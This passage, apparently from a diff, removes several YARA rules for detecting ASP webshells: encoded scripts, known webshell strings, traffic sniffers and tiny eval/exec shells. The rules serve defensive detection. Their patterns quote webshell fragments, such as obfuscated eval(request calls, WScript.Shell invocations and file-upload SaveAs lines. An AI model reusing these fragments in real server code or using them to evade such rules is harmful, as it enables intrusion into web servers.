-        all of ( $asp_multi_payload_two* ) or
-        all of ( $asp_multi_payload_three* ) or
-        all of ( $asp_multi_payload_four* ) or
-        all of ( $asp_multi_payload_five* )
-        )
-        or (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
-            any of ( $asp_streamwriter* )
-        )
-        )
-        ) and not any of ( $fp* ) and
-        ( filesize < 200 or
-        ( filesize < 1000 and any of ( $susasp* ) ) )
-}
-
-rule WEBSHELL_ASP_Encoded
-{
-    meta:
-        description = "Webshell in VBscript or JScript encoded using *.Encode plus a suspicious string"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        hash = "1bc7327f9d3dbff488e5b0b69a1b39dcb99b3399"
-        hash = "9885ee1952b5ad9f84176c9570ad4f0e32461c92"
-        hash = "27a020c5bc0dbabe889f436271df129627b02196"
-        hash = "f41f8c82b155c3110fc1325e82b9ee92b741028b"
-        hash = "af40f4c36e3723236c59dc02f28a3efb047d67dd"
-
-        id = "67c0e1f6-6da5-569c-ab61-8b8607429471"
-    strings:
-        $encoded1 = "VBScript.Encode" nocase wide ascii
-        $encoded2 = "JScript.Encode" nocase wide ascii
-        $data1 = "#@~^" wide ascii
-        $sus1 = "shell" nocase wide ascii
-        $sus2 = "cmd" fullword wide ascii
-        $sus3 = "password" fullword wide ascii
-        $sus4 = "UserPass" fullword wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        filesize < 500KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and any of ( $encoded* ) and any of ( $data* ) and
-        ( any of ( $sus* ) or
-        ( filesize < 20KB and #data1 > 4 ) or
-        ( filesize < 700 and #data1 > 0 ) )
-}
-
-rule WEBSHELL_ASP_Encoded_AspCoding
-{
-    meta:
-        description = "ASP Webshell encoded using ASPEncodeDLL.AspCoding"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        score = 60
-        hash = "7cfd184ab099c4d60b13457140493b49c8ba61ee"
-        hash = "f5095345ee085318235c11ae5869ae564d636a5342868d0935de7582ba3c7d7a"
-
-        id = "788a8dae-bcb8-547c-ba17-e1f14bc28f34"
-    strings:
-        $encoded1 = "ASPEncodeDLL" fullword nocase wide ascii
-        $encoded2 = ".Runt" nocase wide ascii
-        $encoded3 = "Request" fullword nocase wide ascii
-        $encoded4 = "Response" fullword nocase wide ascii
-        $data1 = "AspCoding.EnCode" wide ascii
-        //$sus1 = "shell" nocase wide ascii
-        //$sus2 = "cmd" fullword wide ascii
-        //$sus3 = "password" fullword wide ascii
-        //$sus4 = "UserPass" fullword wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        filesize < 500KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and all of ( $encoded* ) and any of ( $data* )
-}
-
-rule WEBSHELL_ASP_By_String
-{
-    meta:
-        description = "Known ASP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021-01-13"
-        modified = "2023-04-05"
-        hash = "f72252b13d7ded46f0a206f63a1c19a66449f216"
-        hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
-        hash = "56a54fe1f8023455800fd0740037d806709ffb9ece1eb9e7486ad3c3e3608d45"
-        hash = "4ef5d8b51f13b36ce7047e373159d7bb42ca6c9da30fad22e083ab19364c9985"
-        hash = "e90c3c270a44575c68d269b6cf78de14222f2cbc5fdfb07b9995eb567d906220"
-        hash = "8a38835f179e71111663b19baade78cc3c9e1f6fcc87eb35009cbd09393cbc53"
-        hash = "f2883e9461393b33feed4139c0fc10fcc72ff92924249eb7be83cb5b76f0f4ee"
-        hash = "10cca59c7112dfb1c9104d352e0504f842efd4e05b228b6f34c2d4e13ffd0eb6"
-        hash = "ed179e5d4d365b0332e9ffca83f66ee0afe1f1b5ac3c656ccd08179170a4d9f7"
-        hash = "ce3273e98e478a7e95fccce0a3d3e8135c234a46f305867f2deacd4f0efa7338"
-        hash = "65543373b8bd7656478fdf9ceeacb8490ff8976b1fefc754cd35c89940225bcf"
-        hash = "de173ea8dcef777368089504a4af0804864295b75e51794038a6d70f2bcfc6f5"
-
-
-        id = "4705b28b-2ffa-53d1-b727-1a9fc2a7dd69"
-    strings:
-        // reversed
-        $asp_string1  = "tseuqer lave" wide ascii
-        $asp_string2  = ":eval request(" wide ascii
-        $asp_string3  = ":eval request(" wide ascii
-        $asp_string4  = "SItEuRl=\"http://www.zjjv.com\"" wide ascii
-        $asp_string5  = "ServerVariables(\"HTTP_HOST\"),\"gov.cn\"" wide ascii
-        // e+k-v+k-a+k-l
-        // e+x-v+x-a+x-l
-        $asp_string6  = /e\+.-v\+.-a\+.-l/ wide ascii
-        $asp_string7  = "r+x-e+x-q+x-u" wide ascii
-        $asp_string8  = "add6bb58e139be10" fullword wide ascii
-        $asp_string9  = "WebAdmin2Y.x.y(\"" wide ascii
-        $asp_string10 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[" wide ascii
-        $asp_string11 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(" wide ascii
-        // Request.Item["
-        $asp_string12 = "UmVxdWVzdC5JdGVtWyJ" wide ascii
-
-        // eval( in utf7 in base64 all 3 versions
-        $asp_string13 = "UAdgBhAGwAKA" wide ascii
-        $asp_string14 = "lAHYAYQBsACgA" wide ascii
-        $asp_string15 = "ZQB2AGEAbAAoA" wide ascii
-        // request in utf7 in base64 all 3 versions
-        $asp_string16 = "IAZQBxAHUAZQBzAHQAKA" wide ascii
-        $asp_string17 = "yAGUAcQB1AGUAcwB0ACgA" wide ascii
-        $asp_string18 = "cgBlAHEAdQBlAHMAdAAoA" wide ascii
-
-        $asp_string19 = "\"ev\"&\"al" wide ascii
-        $asp_string20 = "\"Sc\"&\"ri\"&\"p" wide ascii
-        $asp_string21 = "C\"&\"ont\"&\"" wide ascii
-        $asp_string22 = "\"vb\"&\"sc" wide ascii
-        $asp_string23 = "\"A\"&\"do\"&\"d" wide ascii
-        $asp_string24 = "St\"&\"re\"&\"am\"" wide ascii
-        $asp_string25 = "*/eval(" wide ascii
-        $asp_string26 = "\"e\"&\"v\"&\"a\"&\"l" nocase
-        $asp_string27 = "<%eval\"\"&(\"" nocase wide ascii
-        $asp_string28 = "6877656D2B736972786677752B237E232C2A"  wide ascii
-        $asp_string29 = "ws\"&\"cript.shell" wide ascii
-        $asp_string30 = "SerVer.CreAtEoBjECT(\"ADODB.Stream\")" wide ascii
-        $asp_string31 = "ASPShell - web based shell" wide ascii
-        $asp_string32 = "<++ CmdAsp.asp ++>" wide ascii
-        $asp_string33 = "\"scr\"&\"ipt\"" wide ascii
-        $asp_string34 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" wide ascii
-        $asp_string35 = "\"she\"&\"ll." wide ascii
-        $asp_string36 = "LH\"&\"TTP" wide ascii
-        $asp_string37 = "<title>Web Sniffer</title>" wide ascii
-        $asp_string38 = "<title>WebSniff" wide ascii
-        $asp_string39 = "cript\"&\"ing" wide ascii
-        $asp_string40 = "tcejbOmetsySeliF.gnitpircS" wide ascii
-        $asp_string41 = "tcejbOetaerC.revreS" wide ascii
-        $asp_string42 = "This file is part of A Black Path Toward The Sun (\"ABPTTS\")" wide ascii
-        $asp_string43 = "if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))" wide ascii
-        $asp_string44 = "if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))" wide ascii
-        $asp_string45 = "Response.Write(Server.HtmlEncode(ExcutemeuCmd(txtArg.Text)));" wide ascii
-        $asp_string46 = "\"c\" + \"m\" + \"d\"" wide ascii
-        $asp_string47 = "\".\"+\"e\"+\"x\"+\"e\"" wide ascii
-        $asp_string48 = "Tas9er" fullword wide ascii
-        $asp_string49 = "<%@ Page Language=\"\\u" wide ascii
-        $asp_string50 = "BinaryRead(\\u" wide ascii
-        $asp_string51 = "Request.\\u" wide ascii
-        $asp_string52 = "System.Buffer.\\u" wide ascii
-        $asp_string53 = "System.Net.\\u" wide ascii
-        $asp_string54 = ".\\u0052\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\"" wide ascii
-        $asp_string55 = "\\u0041\\u0073\\u0073\\u0065\\u006d\\u0062\\u006c\\u0079.\\u004c\\u006f\\u0061\\u0064" wide ascii
-        $asp_string56 = "\\U00000052\\U00000065\\U00000071\\U00000075\\U00000065\\U00000073\\U00000074[\"" wide ascii
-        $asp_string57 = "*/\\U0000" wide ascii
-        $asp_string58 = "\\U0000FFFA" wide ascii
-        $asp_string59 = "\"e45e329feb5d925b\"" wide ascii
-        $asp_string60 = ">POWER!shelled<" wide ascii
-        $asp_string61 = "@requires xhEditor" wide ascii
-
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        filesize < 200KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and any of ( $asp_string* )
-}
-
-rule WEBSHELL_ASP_Sniffer
-{
-    meta:
-        description = "ASP webshell which can sniff local traffic"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        hash = "1206c22de8d51055a5e3841b4542fb13aa0f97dd"
-        hash = "60d131af1ed23810dbc78f85ee32ffd863f8f0f4"
-        hash = "c3bc4ab8076ef184c526eb7f16e08d41b4cec97e"
-        hash = "ed5938c04f61795834751d44a383f8ca0ceac833"
-
-        id = "b5704c19-fce1-5210-8185-4839c1c5a344"
-    strings:
-        $sniff1 = "Socket(" wide ascii
-        $sniff2 = ".Bind(" wide ascii
-        $sniff3 = ".SetSocketOption(" wide ascii
-        $sniff4 = ".IOControl(" wide ascii
-        $sniff5 = "PacketCaptureWriter" fullword wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and filesize < 30KB and all of ( $sniff* )
-}
-
-rule WEBSHELL_ASP_Generic_Tiny
-{
-    meta:
-        description = "Generic tiny ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-07-05"
-        hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
-        hash = "52ce724580e533da983856c4ebe634336f5fd13a"
-        hash = "0864f040a37c3e1cef0213df273870ed6a61e4bc"
-        hash = "b184dc97b19485f734e3057e67007a16d47b2a62"
-
-        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
-    strings:
-        $fp1 = "net.rim.application.ipproxyservice.AdminCommand.execute"
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-        //strings from private rule capa_asp_payload
-        $asp_payload0  = "eval_r" fullword nocase wide ascii
-        $asp_payload1  = /\beval\s/ nocase wide ascii
-        $asp_payload2  = /\beval\(/ nocase wide ascii
-        $asp_payload3  = /\beval\"\"/ nocase wide ascii
-        // var Fla = {'E':eval};  Fla.E(code)
-        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
-        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
-        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
-        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
-        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
-        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
-        $asp_multi_payload_one2 = "addcode" fullword wide ascii
-        $asp_multi_payload_one3 = /\.run\b/ wide ascii
-        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
-        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
-        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
-        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
-        $asp_multi_payload_three2 = "Process" fullword wide ascii
-        $asp_multi_payload_three3 = ".Start" wide ascii
-        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
-        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
-        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
